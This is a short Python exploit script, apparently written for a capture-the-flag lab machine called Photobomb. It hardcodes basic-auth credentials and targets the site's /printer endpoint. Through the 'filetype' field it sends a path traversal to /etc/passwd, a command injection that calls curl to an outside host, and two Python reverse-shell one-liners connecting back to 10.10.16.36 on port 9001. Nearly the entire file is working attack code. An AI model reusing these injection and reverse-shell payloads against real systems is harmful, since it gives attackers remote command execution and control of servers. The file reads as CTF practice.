import requests
import re

TARGET = 'http://pH0t0:b0Mb!@photobomb.htb'

# Get photo paths
r = requests.get(TARGET + '/printer')
photo_paths = [m.group(0) for m in re.finditer(r'([^\"(])*\.(jpg|png)', r.text)]
# print(photo_paths)

# Download photo
data = {
    'photo': 'voicu-apostol-MWER49YaD-M-unsplash.jpg',
    'filetype': 'jpg',
    'dimensions': '30x20'
}

# Failed to generate a copy of voicu-apostol-MWER49YaD-M-unsplash.jpg
data = {
    'photo': 'voicu-apostol-MWER49YaD-M-unsplash.jpg',
    'filetype': 'jpg/../../../../../etc/passwd',
    'dimensions': '10x10'
}

data = {
    'photo': 'voicu-apostol-MWER49YaD-M-unsplash.jpg',
    'filetype': 'jpg;curl 10.10.16.36/abc',
    'dimensions': '10x10'
}

# Revshell (nc -lvnp 9001)
data = {
    'photo': 'voicu-apostol-MWER49YaD-M-unsplash.jpg',
    'filetype': 'jpg;export RHOST="10.10.16.36";export RPORT=9001;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\'',
    'dimensions': '10x10'
}

# Revshell (nc -lvnp 9001)
data = {
    'photo': 'voicu-apostol-MWER49YaD-M-unsplash.jpg',
    'filetype': 'jpg;python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.36",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\'',
    'dimensions': '10x10'
}
r = requests.post(TARGET + '/printer', data=data)
print(r.text)
